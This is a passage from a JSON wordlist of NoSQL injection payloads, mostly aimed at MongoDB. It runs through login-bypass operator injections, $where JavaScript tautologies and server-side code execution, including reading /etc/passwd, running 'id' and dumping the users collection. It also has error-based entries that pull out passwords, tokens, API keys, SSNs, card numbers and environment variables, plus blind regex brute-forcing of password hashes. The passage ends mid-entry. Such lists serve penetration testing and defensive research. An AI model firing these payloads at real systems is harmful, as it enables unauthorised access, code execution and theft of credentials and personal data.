{
  "meta": {
    "description": "ULTRA-COMPREHENSIVE NoSQL Injection Payload Dataset - ALL Known Techniques",
    "version": "4.0-COMPLETE",
    "total_categories": 50,
    "databases_covered": [
      "MongoDB",
      "CouchDB",
      "Redis",
      "Elasticsearch",
      "DynamoDB",
      "Cassandra",
      "Firebase",
      "HBase",
      "Neo4j",
      "Couchbase",
      "ArangoDB",
      "OrientDB",
      "RavenDB",
      "InfluxDB",
      "FaunaDB",
      "Firestore"
    ],
    "sources": [
      "PayloadsAllTheThings",
      "HackTricks",
      "PortSwigger",
      "OWASP Testing Guide",
      "NosqlMap",
      "NoSQLAttack",
      "cr0hn/nosqlinjection_wordlists",
      "exploit-db",
      "GitHub Security Advisories",
      "CVE Database",
      "CTF writeups (HackTheBox, TryHackMe, PicoCTF, DEFCON, GoogleCTF)",
      "Research papers: Mongo injection, CouchDB attack surfaces",
      "Manual analysis and custom generation"
    ]
  },
  "mongodb_operator_ne": {
    "description": "$ne (not equal) - all variants",
    "json_payloads": [
      {
        "username": {
          "$ne": null
        },
        "password": {
          "$ne": null
        }
      },
      {
        "username": {
          "$ne": ""
        },
        "password": {
          "$ne": ""
        }
      },
      {
        "username": {
          "$ne": "foo"
        },
        "password": {
          "$ne": "bar"
        }
      },
      {
        "username": {
          "$ne": "invalid"
        },
        "password": {
          "$ne": "invalid"
        }
      },
      {
        "username": {
          "$ne": "nonexistent"
        },
        "password": {
          "$ne": "nonexistent"
        }
      },
      {
        "username": {
          "$ne": 0
        },
        "password": {
          "$ne": 0
        }
      },
      {
        "username": {
          "$ne": -1
        },
        "password": {
          "$ne": -1
        }
      },
      {
        "username": {
          "$ne": false
        },
        "password": {
          "$ne": false
        }
      },
      {
        "username": {
          "$ne": true
        },
        "password": {
          "$ne": true
        }
      },
      {
        "username": {
          "$ne": []
        },
        "password": {
          "$ne": []
        }
      },
      {
        "username": {
          "$ne": {}
        },
        "password": {
          "$ne": {}
        }
      },
      {
        "username": {
          "$ne": "undefined"
        },
        "password": {
          "$ne": "undefined"
        }
      },
      {
        "username": {
          "$ne": "null"
        },
        "password": {
          "$ne": "null"
        }
      },
      {
        "username": {
          "$ne": "0"
        },
        "password": {
          "$ne": "0"
        }
      },
      {
        "username": {
          "$ne": "false"
        },
        "password": {
          "$ne": "false"
        }
      },
      {
        "user": {
          "$ne": null
        },
        "pass": {
          "$ne": null
        }
      },
      {
        "email": {
          "$ne": null
        },
        "password": {
          "$ne": null
        }
      },
      {
        "login": {
          "$ne": null
        },
        "password": {
          "$ne": null
        }
      },
      {
        "uname": {
          "$ne": null
        },
        "passwd": {
          "$ne": null
        }
      },
      {
        "usr": {
          "$ne": null
        },
        "pwd": {
          "$ne": null
        }
      },
      {
        "username": {
          "$ne": "a"
        },
        "password": {
          "$ne": "a"
        }
      },
      {
        "username": {
          "$ne": "x"
        },
        "password": {
          "$ne": "x"
        }
      },
      {
        "username": {
          "$ne": "z"
        },
        "password": {
          "$ne": "z"
        }
      },
      {
        "username": {
          "$ne": "admin"
        },
        "password": {
          "$ne": "admin"
        }
      },
      {
        "username": {
          "$ne": "test"
        },
        "password": {
          "$ne": "test"
        }
      }
    ],
    "url_encoded": [
      "username[$ne]=toto&password[$ne]=toto",
      "username[$ne]=1&password[$ne]=1",
      "username[$ne]=null&password[$ne]=null",
      "username[$ne]=&password[$ne]=",
      "username[$ne]=foo&password[$ne]=bar",
      "username[$ne]=x&password[$ne]=x",
      "login[$ne]=admin&pass[$ne]=pass",
      "email[$ne]=x@x.com&password[$ne]=x",
      "user[$ne]=x&pass[$ne]=x",
      "username[$ne]=-1&password[$ne]=-1",
      "username[$ne]=undefined&password[$ne]=undefined",
      "username[$ne]=false&password[$ne]=false",
      "username[$ne]=0&password[$ne]=0",
      "uname[$ne]=x&passwd[$ne]=x",
      "usr[$ne]=x&pwd[$ne]=x",
      "username[$ne]=invalid_user_xyz&password[$ne]=invalid_pass_xyz"
    ]
  },
  "mongodb_operator_gt_lt": {
    "description": "$gt $lt $gte $lte - all variants",
    "json_payloads": [
      {
        "username": {
          "$gt": ""
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$gt": null
        },
        "password": {
          "$gt": null
        }
      },
      {
        "username": {
          "$gt": "0"
        },
        "password": {
          "$gt": "0"
        }
      },
      {
        "username": {
          "$gt": " "
        },
        "password": {
          "$gt": " "
        }
      },
      {
        "username": {
          "$gt": "A"
        },
        "password": {
          "$gt": "A"
        }
      },
      {
        "username": {
          "$gt": "a"
        },
        "password": {
          "$gt": "a"
        }
      },
      {
        "username": {
          "$gt": "!"
        },
        "password": {
          "$gt": "!"
        }
      },
      {
        "username": {
          "$gt": "\u0000"
        },
        "password": {
          "$gt": "\u0000"
        }
      },
      {
        "username": {
          "$gte": ""
        },
        "password": {
          "$gte": ""
        }
      },
      {
        "username": {
          "$gte": "a"
        },
        "password": {
          "$gte": "a"
        }
      },
      {
        "username": {
          "$gte": "!"
        },
        "password": {
          "$gte": "!"
        }
      },
      {
        "username": {
          "$gte": " "
        },
        "password": {
          "$gte": " "
        }
      },
      {
        "username": {
          "$lt": "z"
        },
        "password": {
          "$lt": "z"
        }
      },
      {
        "username": {
          "$lt": "{"
        },
        "password": {
          "$lt": "{"
        }
      },
      {
        "username": {
          "$lt": "\uffff"
        },
        "password": {
          "$lt": "\uffff"
        }
      },
      {
        "username": {
          "$lte": "z"
        },
        "password": {
          "$lte": "z"
        }
      },
      {
        "username": {
          "$lte": "\uffff"
        },
        "password": {
          "$lte": "\uffff"
        }
      },
      {
        "username": {
          "$gt": ""
        },
        "password": {
          "$lt": "\uffff"
        }
      },
      {
        "username": {
          "$gte": "a"
        },
        "password": {
          "$lte": "z"
        }
      },
      {
        "username": {
          "$gt": "admin"
        },
        "password": {
          "$lt": "s"
        }
      },
      {
        "username": {
          "$gt": "admin"
        },
        "password": {
          "$gt": "s"
        }
      },
      {
        "username": {
          "$gt": 0
        },
        "password": {
          "$gt": 0
        }
      },
      {
        "username": {
          "$gt": -1
        },
        "password": {
          "$gt": -1
        }
      },
      {
        "username": {
          "$gte": 0
        },
        "password": {
          "$gte": 0
        }
      },
      {
        "username": {
          "$lt": 9999
        },
        "password": {
          "$lt": 9999
        }
      },
      {
        "email": {
          "$gt": ""
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "login": {
          "$gt": ""
        },
        "password": {
          "$gt": ""
        }
      }
    ],
    "url_encoded": [
      "username[$gt]=&password[$gt]=",
      "username[$gte]=&password[$gte]=",
      "username[$gt]=0&password[$gt]=0",
      "username[$lt]=z&password[$lt]=z",
      "username[$gt]=a&password[$gt]=a",
      "username[$gte]=!&password[$gte]=!",
      "username[$lt]=%7B&password[$lt]=%7B",
      "username[$lte]=\uffff&password[$lte]=\uffff",
      "username[$gt]=admin&pass[$lt]=s",
      "username[$gt]=admin&pass[$gt]=s",
      "email[$gt]=&password[$gt]=",
      "login[$gt]=&password[$gt]=",
      "username[$gt]=-1&password[$gt]=-1",
      "username[$gte]=0&password[$gte]=0"
    ]
  },
  "mongodb_operator_regex": {
    "description": "$regex - all variants including options",
    "json_payloads": [
      {
        "username": {
          "$regex": ".*"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$regex": ".+"
        },
        "password": {
          "$regex": ".+"
        }
      },
      {
        "username": {
          "$regex": "^"
        },
        "password": {
          "$regex": "^"
        }
      },
      {
        "username": {
          "$regex": "^admin"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$regex": "admin"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$regex": "^adm"
        },
        "password": {
          "$ne": "1"
        }
      },
      {
        "username": {
          "$regex": "^a"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$regex": "ad.*"
        },
        "password": {
          "$regex": "pa.*"
        }
      },
      {
        "username": {
          "$regex": "[a-z]+"
        },
        "password": {
          "$regex": "[a-z]+"
        }
      },
      {
        "username": {
          "$regex": "[a-zA-Z0-9]+"
        },
        "password": {
          "$regex": "[a-zA-Z0-9]+"
        }
      },
      {
        "username": {
          "$regex": "^(admin|root|administrator)$"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$regex": "^.{1,}$"
        },
        "password": {
          "$regex": "^.{1,}$"
        }
      },
      {
        "username": {
          "$regex": "^[A-Za-z0-9]+"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$regex": ".*",
          "$options": "i"
        },
        "password": {
          "$regex": ".*",
          "$options": "i"
        }
      },
      {
        "username": {
          "$regex": "^admin",
          "$options": "i"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$regex": "ADMIN",
          "$options": "i"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$regex": "^[a-f0-9]{24}$"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$regex": "^[a-f0-9]{32}$"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$regex": "^[a-f0-9]{40}$"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$regex": "^[a-f0-9]{64}$"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$regex": "^\\$2[aby]\\$"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$regex": "(?i)admin"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$regex": "a|b|c|admin|root"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$regex": "^(a|b|c|d|e|f|g|h|i|j|k|l|m|n|o|p|q|r|s|t|u|v|w|x|y|z)"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "email": {
          "$regex": ".*"
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "email": {
          "$regex": ".*@.*"
        },
        "password": {
          "$regex": ".*"
        }
      }
    ],
    "url_encoded": [
      "username[$regex]=.*&password[$regex]=.*",
      "username[$regex]=.%2B&password[$regex]=.%2B",
      "username[$regex]=^admin&password[$regex]=.*",
      "username[$regex]=admin.*&password[$ne]=1",
      "username[$regex]=.{1,}&password[$regex]=.{1,}",
      "username[$regex]=^[a-zA-Z]+&password[$regex]=.*",
      "username[$regex]=^adm&password[$ne]=1",
      "username[$regex]=^(admin|root)$&password[$regex]=.*",
      "username[$regex]=.*&username[$options]=i&password[$regex]=.*",
      "username[$regex]=ADMIN&username[$options]=i&password[$regex]=.*",
      "email[$regex]=.*%40.*&password[$regex]=.*"
    ]
  },
  "mongodb_operator_exists": {
    "description": "$exists - all variants",
    "json_payloads": [
      {
        "username": {
          "$exists": true
        },
        "password": {
          "$exists": true
        }
      },
      {
        "username": {
          "$exists": true
        },
        "password": {
          "$ne": "x"
        }
      },
      {
        "username": {
          "$exists": 1
        },
        "password": {
          "$exists": 1
        }
      },
      {
        "username": "admin",
        "password": {
          "$exists": true
        }
      },
      {
        "email": {
          "$exists": true
        },
        "password": {
          "$exists": true
        }
      },
      {
        "username": {
          "$exists": true,
          "$ne": null
        },
        "password": {
          "$exists": true,
          "$ne": null
        }
      },
      {
        "username": {
          "$exists": true,
          "$gt": ""
        },
        "password": {
          "$exists": true
        }
      },
      {
        "_id": {
          "$exists": true
        },
        "password": {
          "$exists": true
        }
      },
      {
        "username": {
          "$exists": true
        },
        "role": {
          "$exists": true
        }
      },
      {
        "username": {
          "$exists": true
        },
        "token": {
          "$exists": true
        }
      },
      {
        "username": {
          "$exists": true
        },
        "apiKey": {
          "$exists": true
        }
      },
      {
        "username": {
          "$exists": true
        },
        "secret": {
          "$exists": true
        }
      },
      {
        "username": {
          "$exists": true
        },
        "flag": {
          "$exists": true
        }
      },
      {
        "email": {
          "$exists": true
        },
        "role": {
          "$exists": true
        }
      },
      {
        "username": {
          "$exists": false
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "role": {
          "$exists": true
        },
        "password": {
          "$gt": ""
        }
      }
    ],
    "url_encoded": [
      "username[$exists]=true&password[$exists]=true",
      "username[$exists]=1&password[$exists]=1",
      "username=admin&password[$exists]=true",
      "_id[$exists]=true&password[$exists]=true",
      "username[$exists]=true&username[$ne]=null&password[$exists]=true",
      "email[$exists]=true&password[$exists]=true",
      "role[$exists]=true&password[$gt]="
    ]
  },
  "mongodb_operator_in_nin": {
    "description": "$in and $nin operators",
    "json_payloads": [
      {
        "username": {
          "$in": [
            "admin",
            "administrator",
            "root",
            "Admin",
            "ADMIN"
          ]
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$in": [
            "admin",
            "4dm1n",
            "adm1n",
            "root"
          ]
        },
        "password": {
          "$ne": ""
        }
      },
      {
        "username": {
          "$in": [
            "admin",
            "user",
            "test",
            "guest"
          ]
        },
        "password": {
          "$exists": true
        }
      },
      {
        "username": {
          "$nin": []
        },
        "password": {
          "$nin": []
        }
      },
      {
        "username": {
          "$nin": [
            "nonexistent"
          ]
        },
        "password": {
          "$nin": [
            "nonexistent"
          ]
        }
      },
      {
        "username": {
          "$in": [
            "admin"
          ]
        },
        "password": {
          "$in": [
            "password",
            "admin",
            "123456",
            "pass"
          ]
        }
      },
      {
        "role": {
          "$in": [
            "admin",
            "superadmin",
            "root"
          ]
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$in": [
            "admin",
            "ctf",
            "flag",
            "challenge",
            "player"
          ]
        },
        "password": {
          "$ne": null
        }
      },
      {
        "username": {
          "$nin": [
            "guest",
            "banned"
          ]
        },
        "password": {
          "$ne": ""
        }
      },
      {
        "email": {
          "$in": [
            "admin@admin.com",
            "admin@localhost",
            "root@localhost"
          ]
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "username": {
          "$in": [
            "admin",
            "superuser",
            "manager",
            "operator"
          ]
        },
        "password": {
          "$regex": ".*"
        }
      },
      {
        "username": {
          "$nin": [
            "deleted",
            "disabled",
            "locked"
          ]
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "role": {
          "$in": [
            "admin",
            "superadmin",
            "owner",
            "manager"
          ]
        },
        "password": {
          "$ne": null
        }
      },
      {
        "username": {
          "$in": [
            "admin"
          ]
        },
        "password": {
          "$nin": [
            "wrong",
            "invalid",
            "incorrect"
          ]
        }
      },
      {
        "_id": {
          "$in": [
            "1",
            "2",
            "3",
            "100",
            "1000"
          ]
        }
      },
      {
        "type": {
          "$in": [
            "admin",
            "superuser",
            "root"
          ]
        }
      },
      {
        "level": {
          "$in": [
            9,
            10,
            99,
            100
          ]
        }
      }
    ],
    "url_encoded": [
      "username[$in][]=admin&username[$in][]=root&password[$gt]=",
      "username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7",
      "username[$in][0]=admin&username[$in][1]=administrator&password[$gt]=",
      "username[$nin][0]=guest&username[$nin][1]=banned&password[$gt]=",
      "email[$in][0]=admin@admin.com&email[$in][1]=root@localhost&password[$gt]=",
      "role[$in][0]=admin&role[$in][1]=superadmin&password[$ne]=",
      "username[$in][0]=admin&username[$in][1]=root&username[$in][2]=superadmin&password[$gt]="
    ]
  },
  "mongodb_operator_or_and_nor": {
    "description": "$or, $and, $nor logical operators",
    "json_payloads": [
      {
        "$or": [
          {
            "username": "admin"
          },
          {
            "username": {
              "$ne": ""
            }
          }
        ],
        "password": {
          "$gt": ""
        }
      },
      {
        "$or": [
          {
            "password": {
              "$ne": ""
            }
          },
          {
            "password": {
              "$exists": true
            }
          }
        ]
      },
      {
        "$or": [
          {},
          {
            "a": "a"
          }
        ]
      },
      {
        "$or": [
          {
            "role": "admin"
          },
          {
            "isAdmin": true
          }
        ],
        "password": {
          "$gt": ""
        }
      },
      {
        "$or": [
          {
            "username": "admin"
          },
          {
            "role": "admin"
          }
        ],
        "password": {
          "$gt": ""
        }
      },
      {
        "$or": [
          {
            "username": {
              "$exists": true
            }
          },
          {
            "email": {
              "$exists": true
            }
          }
        ],
        "password": {
          "$gt": ""
        }
      },
      {
        "$and": [
          {
            "username": {
              "$ne": ""
            }
          },
          {
            "password": {
              "$ne": ""
            }
          }
        ]
      },
      {
        "$and": [
          {
            "username": {
              "$exists": true
            }
          },
          {
            "password": {
              "$gt": ""
            }
          }
        ]
      },
      {
        "$and": [
          {
            "role": {
              "$in": [
                "admin",
                "superadmin"
              ]
            }
          },
          {
            "password": {
              "$ne": null
            }
          }
        ]
      },
      {
        "$nor": [
          {
            "username": "invalid_xyz"
          },
          {
            "username": "nonexistent_abc"
          }
        ],
        "password": {
          "$gt": ""
        }
      },
      {
        "$nor": [
          {
            "username": "deleted"
          },
          {
            "username": "banned"
          }
        ],
        "password": {
          "$gt": ""
        }
      },
      {
        "$or": [
          {
            "username": "admin"
          },
          {
            "$where": "1==1"
          }
        ]
      },
      {
        "username": {
          "$or": [
            {
              "$eq": "admin"
            },
            {
              "$eq": "root"
            }
          ]
        },
        "password": {
          "$gt": ""
        }
      },
      {
        "$or": [
          {
            "username": {
              "$regex": "admin"
            }
          },
          {
            "email": {
              "$regex": "admin"
            }
          }
        ],
        "password": {
          "$gt": ""
        }
      },
      {
        "$and": [
          {
            "$or": [
              {
                "username": "admin"
              },
              {
                "role": "admin"
              }
            ]
          },
          {
            "password": {
              "$ne": null
            }
          }
        ]
      },
      {
        "$nor": [
          {
            "active": false
          },
          {
            "deleted": true
          }
        ],
        "password": {
          "$gt": ""
        }
      }
    ],
    "url_encoded": [
      "[$or][0][username]=admin&[$or][1][username][$ne]=&password[$gt]=",
      "[$or][0][role]=admin&[$or][1][isAdmin]=true&password[$gt]=",
      "[$and][0][username][$ne]=&[$and][1][password][$ne]=",
      "[$nor][0][username]=invalid&[$nor][1][username]=nonexistent&password[$gt]=",
      "[$or][0][username]=admin&[$or][1][$where]=1==1"
    ]
  },
  "mongodb_where_tautology": {
    "description": "$where JavaScript tautology injections",
    "string_payloads": [
      "' || '1'=='1",
      "' || 1==1//",
      "' || 1==1%00",
      "admin' || 'a'=='a",
      "' || true//",
      "' || true%00",
      "'; return true; var x='",
      "'; return 1; var x='",
      "x'; return true; //",
      "x' || this.password != 'x",
      "1, $where: '1 == 1'",
      "true, $where: '1 == 1'",
      ", $where: '1 == 1'",
      "$where: '1 == 1'",
      "', $where: '1 == 1",
      "' || this.username != 'x",
      "' || this.password.length > 0 || 'x'=='x",
      "' || typeof this.password !== 'undefined' || '",
      "'; return this.constructor.constructor('return 1')(); var x='",
      "' || !false || '",
      "' || !!1 || '",
      "' || 0==0 || '",
      "' || 2>1 || '",
      "' || null==null || '",
      "' || undefined==undefined || '",
      "' || NaN!=NaN || '",
      "' || ''=='' || '",
      "' || []==[] || '",
      "' || {}=={} || '",
      "' || typeof ''!='number' || '",
      "' || typeof 0!='string' || '",
      "' || parseInt('1')===1 || '",
      "' || Math.random()>=0 || '",
      "' || isNaN(NaN) || '"
    ],
    "json_payloads": [
      {
        "$where": "1==1"
      },
      {
        "$where": "true"
      },
      {
        "$where": "this.username != null"
      },
      {
        "$where": "this.password.length > 0"
      },
      {
        "$where": "Object.keys(this).length > 0"
      },
      {
        "$where": "1 == 1"
      },
      {
        "$where": "'a'=='a'"
      },
      {
        "$where": "!false"
      },
      {
        "$where": "typeof this.username !== 'undefined'"
      },
      {
        "$where": "!!1"
      },
      {
        "$where": "this.password !== null && this.password !== undefined"
      },
      {
        "$where": "0==0"
      },
      {
        "$where": "2>1"
      },
      {
        "$where": "null==null"
      },
      {
        "$where": "NaN!=NaN"
      },
      {
        "$where": "''==''"
      },
      {
        "$where": "Math.random()>=0"
      },
      {
        "$where": "isNaN(NaN)"
      },
      {
        "$where": "parseInt('1')===1"
      },
      {
        "$where": "typeof ''!='number'"
      },
      {
        "$where": "typeof 0!='string'"
      },
      {
        "$where": "typeof null!='undefined'"
      },
      {
        "$where": "this.constructor!==undefined"
      },
      {
        "$where": "this.hasOwnProperty('_id')"
      },
      {
        "$where": "Object.keys(this).indexOf('_id')>=0"
      }
    ]
  },
  "mongodb_where_code_exec": {
    "description": "$where server-side JavaScript code execution",
    "json_payloads": [
      {
        "$where": "sleep(5000)||true"
      },
      {
        "$where": "function(){var d=new Date();var t=d.getTime();while(d.getTime()<t+5000){d=new Date();}return true;}()"
      },
      {
        "$where": "this.constructor.constructor('return process')().exit()"
      },
      {
        "$where": "function(){return db.version();}()"
      },
      {
        "$where": "function(){return db.runCommand({ping:1});}()"
      },
      {
        "$where": "function(){return db.adminCommand({listDatabases:1}).databases.map(function(d){return d.name}).join(',');}()"
      },
      {
        "$where": "function(){var r=db.runCommand({listCollections:1});return r.cursor.firstBatch.map(function(c){return c.name}).join(',');}()"
      },
      {
        "$where": "db.injection.insert({success:1});return true;"
      },
      {
        "$where": "db.users.find().forEach(function(u){db.pwned.insert(u)});return true;"
      }
    ],
    "string_payloads": [
      "'; sleep(5000); var x='",
      "';sleep(5000);",
      "';it=new Date();do{pt=new Date();}while(pt-it<5000);",
      "'; var d=new Date(); var t=d.getTime(); while(d.getTime()<t+5000){d=new Date()}; x='",
      "db.injection.insert({success:1});",
      "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
      "'; while(true){}; var x='",
      "'; load('/etc/passwd'); var x='",
      "'; run('id'); var x='",
      "'; java.lang.Runtime.getRuntime().exec('id'); var x='",
      "'; this.constructor.constructor('return process')().exit(); var x='"
    ]
  },
  "mongodb_where_error_exfil": {
    "description": "Error-based data exfiltration via $where throw",
    "json_payloads": [
      {
        "$where": "throw new Error(JSON.stringify(this))"
      },
      {
        "$where": "throw new Error(tojson(this))"
      },
      {
        "$where": "throw new Error(Object.keys(this).join(','))"
      },
      {
        "$where": "if(this.password) throw new Error(this.password)"
      },
      {
        "$where": "if(this.username) throw new Error(this.username)"
      },
      {
        "$where": "if(this.role) throw new Error(this.role)"
      },
      {
        "$where": "if(this.token) throw new Error(this.token)"
      },
      {
        "$where": "if(this.apiKey) throw new Error(this.apiKey)"
      },
      {
        "$where": "if(this.secret) throw new Error(this.secret)"
      },
      {
        "$where": "if(this.flag) throw new Error(this.flag)"
      },
      {
        "$where": "if(this.hash) throw new Error(this.hash)"
      },
      {
        "$where": "if(this.salt) throw new Error(this.salt)"
      },
      {
        "$where": "if(this.resetToken) throw new Error(this.resetToken)"
      },
      {
        "$where": "if(this.otp) throw new Error(this.otp)"
      },
      {
        "$where": "if(this.privateKey) throw new Error(this.privateKey)"
      },
      {
        "$where": "if(this.sessionId) throw new Error(this.sessionId)"
      },
      {
        "$where": "if(this.twoFactorSecret) throw new Error(this.twoFactorSecret)"
      },
      {
        "$where": "if(this.backupCode) throw new Error(this.backupCode)"
      },
      {
        "$where": "if(this.creditCard) throw new Error(this.creditCard)"
      },
      {
        "$where": "if(this.ssn) throw new Error(this.ssn)"
      },
      {
        "$where": "if(this.isAdmin==true) throw new Error(JSON.stringify(this))"
      },
      {
        "$where": "if(this.role=='admin') throw new Error(JSON.stringify(this))"
      },
      {
        "$where": "throw new Error(this.constructor.constructor('return process.env')())"
      },
      {
        "$where": "var x=JSON.stringify(this); throw new Error(x.substring(0,200))"
      },
      {
        "$where": "throw new Error(Object.keys(this).map(function(k){return k+':'+this[k]}).join('|'))"
      }
    ],
    "paginated": [
      {
        "$where": "if (this._id > ObjectId('000000000000000000000000')) { throw new Error(JSON.stringify(this)) }"
      },
      {
        "$where": "if (this._id > '66d5ef7d01c52a87f75e739c') { throw new Error(JSON.stringify(this)) }"
      },
      {
        "$where": "if (this._id > ObjectId('000000000000000000000001')) { throw new Error(this.password) }"
      },
      {
        "$where": "var i=0; for(var k in this){ if(i++==0) throw new Error(k+':'+this[k]); }"
      },
      {
        "$where": "var keys=Object.keys(this); throw new Error(keys[0]+':'+this[keys[0]])"
      },
      {
        "$where": "var keys=Object.keys(this); throw new Error(keys[1]+':'+this[keys[1]])"
      },
      {
        "$where": "var keys=Object.keys(this); throw new Error(keys[2]+':'+this[keys[2]])"
      }
    ]
  },
  "mongodb_blind_regex_brute": {
    "description": "Blind injection via $regex for character-by-character brute force",
    "length_detection": [
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{1}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{2}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{3}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{4}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{5}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{6}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{7}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{8}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{9}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{10}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{11}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{12}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{13}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{14}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{15}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{16}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{17}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{18}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{19}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{20}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{24}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{25}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{30}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{32}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{40}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{60}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{64}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{128}"
        }
      },
      {
        "username": {
          "$ne": "toto"
        },
        "password": {
          "$regex": ".{256}"
        }
      }
    ],
    "char_extraction_template": [
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^a"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^b"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^c"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^d"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^e"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^f"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^0"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^1"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^2"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^3"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^[a-f]"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^[0-9]"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^[A-Z]"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^[a-z]"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^[a-f0-9]{32}$"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^[a-f0-9]{40}$"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^[a-f0-9]{64}$"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^\\$2[aby]\\$"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^\\$2[aby]\\$[0-9]{2}\\$"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^[A-Fa-f0-9]{32}$"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^[A-Z0-9]{10,}$"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^sha"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^md5"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^pbkdf2"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^argon2"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "password": {
          "$regex": "^scrypt"
        }
      }
    ],
    "token_field_extraction": [
      {
        "username": {
          "$eq": "admin"
        },
        "token": {
          "$regex": "^a"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "token": {
          "$regex": "^[a-f0-9]"
        }
      },
      {
        "username": {
          "$eq": "admin"
        },
        "apiKey": {
